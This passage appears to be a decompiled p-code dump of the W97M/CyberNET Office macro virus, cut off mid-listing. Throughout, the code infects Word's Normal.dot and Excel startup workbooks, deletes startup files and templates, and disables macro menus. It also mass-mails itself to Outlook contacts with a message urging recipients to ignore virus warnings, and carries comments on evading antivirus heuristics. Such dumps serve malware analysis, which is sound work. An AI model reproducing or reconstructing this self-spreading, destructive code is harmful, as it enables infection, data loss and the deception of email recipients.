' 	Ld MB7293 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000C "CommandBars("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Tools"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B ").Controls("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Macro"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 ").Enabled = False"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000F "Call ViewVBCode"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000E "Sub FileOpen()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0020 "WordBasic.DisableAutoMacros True"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0031 "If Dialogs(80).Show <> 0 Then Call Document_Close"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0021 "WordBasic.DisableAutoMacros False"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000E "Sub AutoExec()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0020 "WordBasic.DisableAutoMacros True"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "Call Document_Close"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0021 "WordBasic.DisableAutoMacros False"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	ArgsLd RN8755 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #72:
' 	LitStr 0x0005 "HN937"
' 	LitDI2 0x0001 
' 	ArgsLd RN8755 0x0001 
' 	MemSt New 
' Line #73:
' 	LitStr 0x0008 "CyberNET"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set ST911 
' Line #76:
' 	Ld ST911 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "CYBERNET.XLS"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #77:
' 	LineCont 0x0004 14 00 00 00
' 	Ld ST911 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "CYBERNET.XLS"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ST911 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Add 
' 	Paren 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #78:
' 	LineCont 0x0004 0E 00 00 00
' 	Ld ST911 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0006 "\*.xl?"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ST911 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0006 "\*.xl?"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #79:
' 	SetStmt 
' 	Ld ST911 
' 	MemLd Workbooks 
' 	MemLd Add 
' 	Set OU8710 
' Line #80:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0012 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld OU8710 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0097 
' 	LitStr 0x0027 "Attachments.Add ActiveWorkbook.FullName"
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld OU8710 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #82:
' 	Ld ST911 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Concat 
' 	Ld OU8710 
' 	ArgsMemCall SaveAs 0x0001 
' Line #83:
' 	LitStr 0x0008 "CyberNET"
' 	Ld ST911 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #84:
' 	LitVarSpecial (False)
' 	Ld ST911 
' 	MemLd ActiveWindow 
' 	MemSt Visible 
' Line #85:
' 	LitStr 0x000C "CyberNET.xls"
' 	Ld ST911 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #86:
' 	Ld ST911 
' 	ArgsMemCall Quit 0x0000 
' Line #87:
' 	Ld ST911 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Add 
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Ld HT202 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld MB7293 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #90:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #91:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Private Function QC586(MT3412, SA6469 As String, id_FFFE As Variant))
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	Dim 
' 	VarDefn PG353 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn PV8948 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn MO4724 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn BE1547 (As Long)
' Line #97:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #98:
' 	LitDI2 0x0001 
' 	St PG353 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St PV8948 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St MO4724 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St BE1547 
' Line #99:
' 	Ld SA6469 
' 	Ld PG353 
' 	Ld PV8948 
' 	Ld MO4724 
' 	Ld BE1547 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #100:
' 	Ld PG353 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St QJ6170 
' Line #101:
' 	LineCont 0x0008 02 00 00 00 0D 00 00 00
' 	Ld QJ6170 
' 	Ld PV8948 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld MT3412 
' 	Concat 
' 	Ld QJ6170 
' 	Ld BE1547 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St QJ6170 
' Line #102:
' 	Ld PG353 
' 	Ld QJ6170 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #103:
' 	Ld MO4724 
' 	LitDI2 0x0001 
' 	Add 
' 	St PG353 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St PV8948 
' Line #104:
' 	MemLdWith CountOfLines 
' 	St MO4724 
' Line #105:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St BE1547 
' Line #106:
' 	Loop 
' Line #107:
' 	EndWith 
' Line #108:
' 	EndFunc 
' Line #109:
' 	FuncDefn (Private Function KP6522(RN8755, id_FFFE As Variant))
' Line #110:
' 	Dim 
' 	VarDefn AV1314 (As Object)
' Line #111:
' 	StartForVariable 
' 	Ld AV1314 
' 	EndForVariable 
' 	Ld RN8755 
' 	ForEach 
' Line #112:
' 	LineCont 0x0004 07 00 00 00
' 	LitDI2 0x0001 
' 	Ld AV1314 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AV1314 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #113:
' 	StartForVariable 
' 	Ld AV1314 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	EndFunc 
' Line #115:
' 	FuncDefn (Private Function GP1055(id_FFFE As Variant))
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	Dim 
' 	VarDefn VN95
' 	VarDefn TE9976
' 	VarDefn PB5760
' Line #118:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set VN95 
' Line #119:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld VN95 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set TE9976 
' Line #120:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0008 "CyberNET"
' 	LitStr 0x0008 "CyberNET"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x001F "(C)2000 - Indonesia By AnomOke!"
' 	Ne 
' 	IfBlock 
' Line #121:
' 	Ld VN95 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #122:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld TE9976 
' 	ArgsMemCall Logon 0x0002 
' Line #123:
' 	LineCont 0x0004 09 00 00 00
' 	StartForVariable 
' 	Ld VJ455 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TE9976 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x0006 0x0032 "anti-heuristic for stupid Norton antivirus scanner"
' Line #124:
' 	SetStmt 
' 	Ld VJ455 
' 	Ld TE9976 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set EJ8475 
' Line #125:
' 	LitDI2 0x0001 
' 	St JJ789 
' Line #126:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld VN95 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set PB5760 
' Line #127:
' 	StartForVariable 
' 	Ld QA8567 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld EJ8475 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #128:
' 	Ld JJ789 
' 	Ld EJ8475 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St FP6716 
' Line #129:
' 	Ld FP6716 
' 	Ld PB5760 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #130:
' 	LineCont 0x0004 02 00 00 00
' 	Ld JJ789 
' 	LitDI2 0x0001 
' 	Add 
' 	St JJ789 
' Line #131:
' 	Ld JJ789 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld EJ8475 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St QA8567 
' 	EndIf 
' Line #132:
' 	StartForVariable 
' 	Ld QA8567 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' 	LitStr 0x0013 "You've GOT Mail !!!"
' 	Ld PB5760 
' 	MemSt Subject 
' Line #134:
' 	LitStr 0x0098 "Please, saved the document after you read and don't show to anyone else. The document is also VIRUS FREE...so DISREGARD the virus protection warning !!!"
' 	Ld PB5760 
' 	MemSt Body 
' Line #135:
' 	LineCont 0x0004 02 00 00 00
' 	Ld ActiveWorkbook 
' 	MemLd FullName 
' 	Ld PB5760 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #136:
' 	LineCont 0x0004 02 00 00 00
' 	Ld PB5760 
' 	ArgsMemCall Send 0x0000 
' 	QuoteRem 0x0005 0x0032 "anti-heuristic for stupid McAfee antivirus scanner"
' Line #137:
' 	LitStr 0x0000 ""
' 	St FP6716 
' Line #138:
' 	StartForVariable 
' 	Ld VJ455 
' 	EndForVariable 
' 	NextVar 
' Line #139:
' 	Ld TE9976 
' 	ArgsMemCall Logoff 0x0000 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0008 "CyberNET"
' 	LitStr 0x0008 "CyberNET"
' 	LitStr 0x001F "(C)2000 - Indonesia By AnomOke!"
' 	ArgsCall SaveSetting 0x0004 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	EndFunc 
' Line #144:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #145:
' 	OnError (Resume Next) 
' Line #146:
' 	Ld xlDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #147:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' Line #148:
' 	StartForVariable 
' 	Ld VO9720 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #149:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x000C 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld VO9720 
' 	Concat 
' 	St GI6166 
' Line #150:
' 	Ld GI6166 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall AddComment 0x0000 
' Line #151:
' 	LitVarSpecial (True)
' 	Ld GI6166 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemSt Visible 
' Line #152:
' 	LitStr 0x0021 "(C)2000 - CyberNET From Indonesia"
' 	ParamNamed Then 
' 	Ld GI6166 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	ArgsMemCall Then 0x0001 
' Line #153:
' 	LitVarSpecial (True)
' 	Ld GI6166 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemLd Shape 
' 	ArgsMemCall Set 0x0001 
' Line #154:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementLeft 0x0001 
' Line #155:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld VO9720 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' 	Ld ActiveWorkbook 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	ArgsCall (Call) HG3579 0x0000 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #157:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set PV1223 
' Line #158:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "CYBERNET.XLS"
' 	Ne 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #159:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set UR5071 
' Line #160:
' 	Ld UR5071 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #161:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set UR5071 
' Line #162:
' 	LitVarSpecial (True)
' 	St UR9551 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #165:
' 	LineCont 0x0004 0E 00 00 00
' 	Ld UR5071 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0006 "\*.do?"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld UR5071 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0006 "\*.do?"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #166:
' 	SetStmt 
' 	Ld UR5071 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set RN8755 
' Line #167:
' 	LitVarSpecial (False)
' 	Ld UR5071 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #168:
' 	LitDI2 0x0001 
' 	LitStr 0x0012 "Public Sub HN937()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0005 
' 	LitDI2 0x0004 
' 	Ld PV1223 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd RN8755 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #169:
' 	LitStr 0x0019 "Normal.ThisDocument.HN937"
' 	Ld UR5071 
' 	ArgsMemCall Run 0x0001 
' Line #170:
' 	Ld RN8755 
' 	ArgsCall (Call) KP6522 0x0001 
' Line #171:
' 	LineCont 0x0010 0C 00 00 00 42 00 00 00 5A 00 00 00 69 00 00 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld PV1223 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld PV1223 
' 	ArgsMemLd Lines 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000C "CommandBars("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Tools"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B ").Controls("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Macro"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 ").Enabled = False"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000F "Call ViewVBCode"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000E "Sub FileOpen()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0020 "WordBasic.DisableAutoMacros True"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0031 "If Dialogs(80).Show <> 0 Then Call Document_Close"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0021 "WordBasic.DisableAutoMacros False"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000E "Sub AutoExec()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0020 "WordBasic.DisableAutoMacros True"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "Call Document_Close"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0021 "WordBasic.DisableAutoMacros False"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd RN8755 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #172:
' 	LitStr 0x0008 "CyberNET"
' 	Ld UR5071 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #173:
' 	LitStr 0x0005 "HN937"
' 	LitDI2 0x0001 
' 	ArgsLd RN8755 0x0001 
' 	MemSt New 
' Line #174:
' 	LitDI2 0x0097 
' 	LitStr 0x0027 "Attachments.Add ActiveDocument.FullName"
' 	LitDI2 0x0001 
' 	ArgsLd RN8755 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #175:
' 	SetStmt 
' 	LitNothing 
' 	Set RN8755 
' Line #176:
' 	Ld UR9551 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld UR5071 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #177:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "CYBERNET.XLS"
' 	Ne 
' 	IfBlock 
' Line #178:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set ST911 
' Line #179:
' 	SetStmt 
' 	Ld ST911 
' 	MemLd Workbooks 
' 	MemLd Add 
' 	Set OU8710 
' Line #180:
' 	LineCont 0x0004 10 00 00 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld PV1223 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld PV1223 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld OU8710 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #181:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld OU8710 
' 	ArgsMemCall SaveAs 0x0003 
' Line #182:
' 	LitStr 0x0008 "CyberNET"
' 	Ld ST911 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #183:
' 	LitVarSpecial (False)
' 	Ld ST911 
' 	MemLd ActiveWindow 
' 	MemSt Visible 
' Line #184:
' 	LitStr 0x000C "CyberNET.xls"
' 	Ld ST911 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #185:
' 	Ld ST911 
' 	ArgsMemCall Quit 0x0000 
' Line #186:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\CyberNET.xls"
' 	Add 
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #187:
' 	EndIfBlock 
' Line #188:
' 	EndIfBlock 
' Line #189:
' 	LitDI2 0x0003 
' 	LitDI2 0x000E 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000E 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000E "'W97M/CyberNET"
' 	Ne 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd Description 
' 	LitStr 0x0008 "CyberNET"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #190:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set RN8755 
' Line #191:
' 	Ld RN8755 
' 	ArgsCall (Call) KP6522 0x0001 
' Line #192:
' 	LineCont 0x0004 10 00 00 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld PV1223 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld PV1223 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #193:
' 	LitStr 0x0008 "CyberNET"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #194:
' 	EndIfBlock 
' Line #195:
' 	EndSub 
' Line #196:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #197:
' 	OnError (Resume Next) 
' Line #198:
' 	Ld xlDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #199:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #200:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Unhide..."
' 	LitStr 0x0006 "Window"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #201:
' 	LitStr 0x000F "C:\CyberNET.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "CYBERNET.REG"
' 	Ne 
' 	IfBlock 
' Line #202:
' 	Ld Application 
' 	MemLd Version 
' 	LitStr 0x0003 "9.0"
' 	Ne 
' 	IfBlock 
' Line #203:
' 	LitStr 0x000F "C:\CyberNET.reg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
